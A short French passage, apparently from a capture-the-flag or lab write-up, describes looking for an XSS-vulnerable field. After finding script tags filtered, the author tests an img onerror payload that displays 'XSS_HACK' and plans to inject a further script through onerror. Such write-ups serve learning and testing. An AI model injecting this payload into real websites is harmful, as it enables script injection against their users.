On doit d'abord trouver un code vulnérable à xss. Il semble que la balise script ne fonctionne pas. J'ai donc tenté ceci 
```html
<img src=x onerror=alert("XSS_HACK")>
```

On voit l'alerte partir et afficher XSS_HACK, on va alors utiliser onerror pour injecter un autre script